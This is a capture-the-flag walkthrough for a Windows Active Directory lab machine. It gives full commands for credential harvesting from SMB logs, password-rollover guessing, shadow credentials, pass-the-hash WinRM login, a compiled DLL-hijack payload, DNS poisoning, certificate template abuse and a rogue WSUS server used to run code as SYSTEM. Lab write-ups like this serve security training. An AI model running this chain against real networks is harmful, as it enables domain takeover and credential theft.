01

User Flag Path (via DLL Hijack)

1. Recon & Initial Access

sudo ntpdate <TARGET_IP>
echo "<TARGET_IP> DC01.logging.htb logging.htb" | sudo tee -a /etc/hosts

Key ports: 445 (SMB), 5985 (WinRM), 8530/8531 (WSUS)

2. SMB Enumeration

smbclient //<TARGET_IP>/Logs -U 'logging.htb\wallace.everette%Welcome2026@' -c "prompt OFF; recurse ON; mget *"

Found credential in IdentitySync_Trace_20260219.log: a cleartext credential leak in an application sync log

LOGGING\svc_recovery / <password (prior year)>
Why this matteredApplication and sync logs are a routine place for credentials to leak in cleartext — pulling and grepping every readable share is standard practice, not an afterthought.

3. Year-Rollover + Kerberos Ticket

The leaked credential was for the previous year's rotation. The service enforces a predictable yearly password rollover, so the current year's password could be derived from the same pattern:

impacket-getTGT logging.htb/svc_recovery:'<password (current year)>' -dc-ip <TARGET_IP>
export KRB5CCNAME=svc_recovery.ccache
klist
Why this matteredA predictable password-rotation scheme is functionally the same as never rotating the password at all — a leaked credential from any prior cycle just becomes a one-step guess for the current one.

4. Shadow Credentials Attack

certipy-ad shadow auto -k -no-pass -u svc_recovery -dc-ip <TARGET_IP> -target DC01.logging.htb -account 'msa_health$'

Obtained NT hash: 603fc24ee01a9409f83c9d1d701485c5

5. WinRM as msa_health$

evil-winrm -i <TARGET_IP> -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
Why this matteredShadow Credentials is one of the most reliable modern AD privilege-escalation primitives — any write access to an account's key-credential attribute is equivalent to a full password reset, without needing reset rights.

6. DLL Hijack → jaylee.clifton Context (User Flag)

Prepare payload on Kali:

cat > /tmp/settings_update.c << 'EOF'
#include <windows.h>
__declspec(dllexport) void PreUpdateCheck() {
    system("whoami > C:\\ProgramData\\UpdateMonitor\\jaylee_whoami.txt 2>&1");
    system("copy C:\\Users\\jaylee.clifton\\Desktop\\user.txt C:\\ProgramData\\UpdateMonitor\\user.txt >nul 2>&1");
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { return TRUE; }
EOF

i686-w64-mingw32-gcc -shared -o /tmp/settings_update.dll /tmp/settings_update.c
zip -j /tmp/Settings_Update.zip /tmp/settings_update.dll

Deploy via WinRM:

Remove-Item "C:\ProgramData\UpdateMonitor\Settings_Update.zip" -Force -ErrorAction SilentlyContinue
upload /tmp/Settings_Update.zip
Move-Item "C:\Users\msa_health$\Documents\Settings_Update.zip" "C:\ProgramData\UpdateMonitor\Settings_Update.zip" -Force
icacls "C:\ProgramData\UpdateMonitor\Settings_Update.zip" /grant "Everyone:(F)"

Wait ~3 minutes for the scheduled task UpdateChecker Agent.

Check results:

type C:\ProgramData\UpdateMonitor\jaylee_whoami.txt
type C:\ProgramData\UpdateMonitor\user.txt
User Flag
Why this matteredScheduled tasks that load a DLL from a writable location are a classic local privesc primitive on Windows — worth checking any time a foothold account has write access to a path referenced by an automated task running as someone else.
02

Root Flag Path (ESC17 + WSUS Spoof)

7. Get jaylee.clifton's TGT (Rubeus)

Used an improved DLL payload (this time downloading Rubeus and running tgtdeleg). Extracted the base64 kirbi and converted it with impacket-ticketConverter:

export KRB5CCNAME=/tmp/jaylee.ccache
klist

8. DNS Poisoning

cd /tmp/krbrelayx
python3 dnstool.py -u 'logging.htb\jaylee.clifton' -k \
  -dc-ip <TARGET_IP> -dns-ip <TARGET_IP> \
  -r 'wsus.logging.htb' -d <kali vpn> -a add DC01.logging.htb

9. Request UpdateSrv Certificate

certipy-ad req -k -no-pass -u jaylee.clifton -dc-ip <TARGET_IP> \
  -dc-host DC01.logging.htb -target DC01.logging.htb \
  -ca 'logging-DC01-CA' -template UpdateSrv \
  -subject 'CN=wsus.logging.htb' -dns 'wsus.logging.htb' -out /tmp/wsus.pfx

Convert:

openssl pkcs12 -in wsus.pfx -out wsus_cert.pem -nodes -passin pass:

10. Rogue WSUS Server (wsuks)

Start server (in dedicated terminal):

cd /tmp
~/.local/share/pipx/venvs/wsuks/bin/python3 /tmp/run_wsuks.py

11. Trigger Update & Get Root

wuauclt /resetauthorization /detectnow

Wait 60-120 seconds:

type C:\Windows\Temp\root.txt
Root Flag
Why this matteredWSUS is an unusually high-trust internal service by design: it exists specifically to push and execute code on client machines, so redirecting a host to a rogue WSUS instance is one of the more direct "automatic code execution as SYSTEM" paths available once DNS and certificate trust can both be manipulated.

  1. wallace.everette → Leaked svc_recovery credential (year rollover)
